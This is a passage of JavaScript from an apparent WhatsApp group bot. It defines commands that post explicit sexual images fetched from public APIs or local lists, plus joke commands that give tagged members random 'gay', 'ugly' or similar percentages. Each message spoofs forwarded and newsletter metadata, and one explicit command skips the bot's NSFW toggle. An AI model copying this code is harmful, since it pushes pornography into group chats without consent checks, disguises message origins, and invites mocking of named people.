	if (!m.isGroup) return LorenzoStickGroup()
if (!AntiNsfw) return newReply(mess.nsfw)
                await hana()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: result912.video_1 } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                
            }
            break
case 'trap' :{
if (!m.isGroup) return LorenzoStickGroup()
if (!AntiNsfw) return newReply(mess.nsfw)
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'hentai-neko' :
case 'hneko' :{
if (!m.isGroup) return LorenzoStickGroup()
if (!AntiNsfw) return newReply(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'hentai-waifu' :
case 'nwaifu' :{
if (!m.isGroup) return LorenzoStickGroup()
if (!AntiNsfw) return newReply(mess.nsfw)
await hana()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'gasm':{
if (!m.isGroup) return LorenzoStickGroup()
	if (!AntiNsfw) return newReply(mess.nsfw)
await hana()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break  
case 'milf':{
if (!m.isGroup) return LorenzoStickGroup()
await hana()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/milf.json'))
var Lorenzoyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Lorenzoyresult.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break 
case 'animespank':{
if (!m.isGroup) return LorenzoStickGroup()
if (!AntiNsfw) return newReply(mess.nsfw)
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'blowjob':{
if (!m.isGroup) return LorenzoStickGroup()
	if (!AntiNsfw) return newReply(mess.nsfw)
await hana()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'))
var Lorenzoyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Lorenzoyresult.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'cuckold':{
if (!m.isGroup) return LorenzoStickGroup()
	if (!AntiNsfw) return newReply(mess.nsfw)
await hana()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'))
var Lorenzoyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Lorenzoyresult.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'eba':{
if (!m.isGroup) return LorenzoStickGroup()
	if (!AntiNsfw) return newReply(mess.nsfw)
await hana()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
var Lorenzoyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Lorenzoyresult.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'pussy':{
if (!m.isGroup) return LorenzoStickGroup()
	if (!AntiNsfw) return newReply(mess.nsfw)
await hana()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'))
var Lorenzoyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Lorenzoyresult.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'yuri':{
if (!m.isGroup) return LorenzoStickGroup()
	if (!AntiNsfw) return newReply(mess.nsfw)
await hana()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'))
var Lorenzoyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Lorenzoyresult.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'zettai':{
if (!m.isGroup) return LorenzoStickGroup()
	if (!AntiNsfw) return newReply(mess.nsfw)
await hana()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'))
var Lorenzoyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Lorenzoyresult.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'gifblowjob':{
if (!m.isGroup) return LorenzoStickGroup()
if (!AntiNsfw) return newReply(mess.nsfw)
await hana()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video:bogif, gifPlayback:true }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
    break
case 'checkme':{
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await ToxxicTechInc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppLorenzo = await getBuffer(ppuser)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: profile
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: ppLorenzo, mentions: [bet]}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [bet], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
case 'handsomecheck':{
				if (!text) return newReply(`Tag Someone, Example : ${prefix + command} @ToxxicTechInc`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: m.sender, 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
					break
case 'beautifulcheck':{
				if (!text) return newReply(`Tag Someone, Example : ${prefix + command} @ToxxicTechInc`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${tik}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
